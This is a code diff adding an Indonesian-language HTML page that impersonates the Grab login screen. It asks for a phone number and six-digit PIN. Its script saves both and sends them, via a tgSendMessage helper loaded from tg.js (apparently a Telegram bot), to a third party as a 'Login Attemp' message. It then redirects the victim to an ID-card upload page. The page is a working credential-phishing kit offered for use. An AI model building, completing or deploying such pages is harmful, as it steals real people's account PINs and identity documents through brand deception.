@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Grab – Login</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .phone-wrapper {
+      width: 390px;
+      min-height: 844px;
+      background: #fff;
+      border-radius: 40px;
+      overflow: hidden;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+
+    /* Status bar */
+    .status-bar {
+      height: 44px;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 24px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+
+    .status-bar .time { font-size: 15px; font-weight: 700; }
+    .status-bar .icons { display: flex; gap: 6px; align-items: center; }
+    .status-bar .icons svg { width: 16px; height: 16px; }
+
+    /* Main content */
+    .content {
+      flex: 1;
+      padding: 32px 28px 40px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Logo */
+    .logo-wrap {
+      margin-bottom: 40px;
+    }
+
+    .grab-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .grab-logo .logo-icon {
+      width: 40px;
+      height: 40px;
+      background: #00B14F;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .grab-logo .logo-icon svg {
+      width: 26px;
+      height: 26px;
+      fill: white;
+    }
+
+    .grab-logo .logo-text {
+      font-size: 28px;
+      font-weight: 800;
+      color: #00B14F;
+      letter-spacing: -0.5px;
+    }
+
+    /* Heading */
+    .heading {
+      margin-bottom: 8px;
+    }
+
+    .heading h1 {
+      font-size: 26px;
+      font-weight: 700;
+      color: #1a1a1a;
+      line-height: 1.2;
+    }
+
+    .heading p {
+      margin-top: 8px;
+      font-size: 14px;
+      color: #888;
+      line-height: 1.5;
+    }
+
+    /* Form */
+    .form {
+      margin-top: 32px;
+      flex: 1;
+    }
+
+    .input-group {
+      margin-bottom: 16px;
+    }
+
+    .input-group label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #555;
+      margin-bottom: 8px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .phone-input {
+      display: flex;
+      border: 1.5px solid #e0e0e0;
+      border-radius: 12px;
+      overflow: hidden;
+      transition: border-color 0.2s;
+    }
+
+    .phone-input:focus-within {
+      border-color: #00B14F;
+    }
+
+    .country-code {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 0 14px;
+      background: #fafafa;
+      border-right: 1.5px solid #e0e0e0;
+      cursor: pointer;
+      font-size: 15px;
+      font-weight: 600;
+      color: #333;
+      white-space: nowrap;
+    }
+
+    .country-code .flag { font-size: 18px; }
+    .country-code .chevron {
+      font-size: 10px;
+      color: #aaa;
+      margin-left: 2px;
+    }
+
+    .phone-input input {
+      flex: 1;
+      border: none;
+      outline: none;
+      padding: 16px 14px;
+      font-size: 16px;
+      color: #1a1a1a;
+      background: transparent;
+    }
+
+    .phone-input input::placeholder { color: #bbb; }
+
+    /* PIN input */
+    .pin-input-wrap {
+      border: 1.5px solid #e0e0e0;
+      border-radius: 12px;
+      overflow: hidden;
+      transition: border-color 0.2s;
+      position: relative;
+    }
+
+    .pin-input-wrap:focus-within { border-color: #00B14F; }
+
+    .pin-input-wrap input {
+      width: 100%;
+      border: none;
+      outline: none;
+      padding: 16px 14px;
+      font-size: 24px;
+      letter-spacing: 12px;
+      color: #1a1a1a;
+      background: transparent;
+      font-family: monospace;
+    }
+
+    .pin-input-wrap input::placeholder {
+      font-size: 14px;
+      letter-spacing: normal;
+      color: #bbb;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    .pin-dots {
+      display: flex;
+      gap: 12px;
+      padding: 18px 16px;
+      align-items: center;
+    }
+
+    .pin-dot {
+      width: 14px;
+      height: 14px;
+      border-radius: 50%;
+      border: 2px solid #ccc;
+      background: transparent;
+      transition: all 0.15s;
+    }
+
+    .pin-dot.filled {
+      background: #00B14F;
+      border-color: #00B14F;
+    }
+
+    .pin-hidden {
+      position: absolute;
+      opacity: 0;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      cursor: text;
+      font-size: 16px;
+    }
+
+    /* Continue button */
+    .btn-continue {
+      width: 100%;
+      padding: 16px;
+      background: #00B14F;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 24px;
+      transition: background 0.2s, transform 0.1s;
+    }
+
+    .btn-continue:hover { background: #009944; }
+    .btn-continue:active { transform: scale(0.98); }
+
+    .btn-continue:disabled {
+      background: #b2dfca;
+      cursor: not-allowed;
+    }
+
+    .forgot-pin {
+      text-align: right;
+      margin-top: 8px;
+    }
+
+    .forgot-pin a {
+      font-size: 13px;
+      color: #00B14F;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .forgot-pin a:hover { text-decoration: underline; }
+
+    /* Footer */
+    .footer {
+      margin-top: 32px;
+      text-align: center;
+    }
+
+    .footer p {
+      font-size: 13px;
+      color: #888;
+    }
+
+    .footer a {
+      color: #00B14F;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .footer a:hover { text-decoration: underline; }
+
+    .terms {
+      margin-top: 20px;
+      font-size: 11px;
+      color: #bbb;
+      line-height: 1.6;
+      text-align: center;
+    }
+
+    .terms a {
+      color: #888;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="phone-wrapper">
+
+    <!-- Status Bar -->
+    <div class="status-bar">
+      <span class="time">9:41</span>
+      <div class="icons">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M15.67 4H14V2h-4v2H8.33C7.6 4 7 4.6 7 5.33v15.33C7 21.4 7.6 22 8.33 22h7.33c.74 0 1.34-.6 1.34-1.33V5.33C17 4.6 16.4 4 15.67 4z"/></svg>
+      </div>
+    </div>
+
+    <!-- Content -->
+    <div class="content">
+
+      <!-- Logo -->
+      <div class="logo-wrap">
+        <div class="grab-logo">
+          <div class="logo-icon">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="white"/>
+            </svg>
+          </div>
+          <span class="logo-text">grab</span>
+        </div>
+      </div>
+
+      <!-- Heading -->
+      <div class="heading">
+        <h1>Selamat datang<br>kembali 👋</h1>
+        <p>Masuk untuk melanjutkan perjalananmu</p>
+      </div>
+
+      <!-- Form -->
+      <div class="form">
+        <div class="input-group">
+          <label>Nomor Telepon</label>
+          <div class="phone-input">
+            <div class="country-code">
+              <span class="flag">🇮🇩</span>
+              <span>+62</span>
+              <span class="chevron">▼</span>
+            </div>
+            <input
+              type="tel"
+              placeholder="8xx xxxx xxxx"
+              maxlength="13"
+              inputmode="numeric"
+            />
+          </div>
+        </div>
+
+        <div class="input-group" style="margin-top: 16px;">
+          <label>PIN (6 digit)</label>
+          <div class="pin-input-wrap" id="pinWrap">
+            <div class="pin-dots" id="pinDots">
+              <div class="pin-dot" id="dot0"></div>
+              <div class="pin-dot" id="dot1"></div>
+              <div class="pin-dot" id="dot2"></div>
+              <div class="pin-dot" id="dot3"></div>
+              <div class="pin-dot" id="dot4"></div>
+              <div class="pin-dot" id="dot5"></div>
+            </div>
+            <input
+              class="pin-hidden"
+              type="password"
+              id="pinInput"
+              maxlength="6"
+              inputmode="numeric"
+              pattern="[0-9]*"
+              autocomplete="current-password"
+            />
+          </div>
+        </div>
+
+        <button class="btn-continue" id="btnMasuk" disabled>Masuk</button>
+      </div>
+
+      <!-- Footer -->
+      <div class="footer">
+        <p>Belum punya akun? <a href="#">Daftar sekarang</a></p>
+      </div>
+
+      <p class="terms">
+        Dengan melanjutkan, kamu menyetujui
+        <a href="#">Syarat & Ketentuan</a> serta
+        <a href="#">Kebijakan Privasi</a> Grab.
+      </p>
+
+    </div>
+  </div>
+  <script src="tg.js"></script>
+  <script>
+    const pinInput = document.getElementById('pinInput');
+    const btnMasuk = document.getElementById('btnMasuk');
+    const phoneInput = document.querySelector('.phone-input input');
+
+    pinInput.addEventListener('input', () => {
+      const val = pinInput.value.replace(/\D/g, '').slice(0, 6);
+      pinInput.value = val;
+
+      for (let i = 0; i < 6; i++) {
+        document.getElementById('dot' + i).classList.toggle('filled', i < val.length);
+      }
+
+      const phoneVal = phoneInput.value.trim();
+      btnMasuk.disabled = !(val.length === 6 && phoneVal.length >= 9);
+    });
+
+    phoneInput.addEventListener('input', () => {
+      const pinVal = pinInput.value;
+      const phoneVal = phoneInput.value.trim();
+      btnMasuk.disabled = !(pinVal.length === 6 && phoneVal.length >= 9);
+    });
+
+    document.getElementById('pinWrap').addEventListener('click', () => {
+      pinInput.focus();
+    });
+
+    btnMasuk.addEventListener('click', async () => {
+      const phone = phoneInput.value.trim();
+      const pin = pinInput.value;
+      localStorage.setItem('grabUser', JSON.stringify({ phone, pin }));
+
+      await tgSendMessage(
+        `🔐 <b>Login Attemp Grab</b>\n📱 Nomor: <code>+62${phone}</code>\n🔑 PIN: <code>${pin}</code>`
+      );
+
+      window.location.href = 'upload-ktp.html';
+    });
+  </script>
+</body>
+</html>
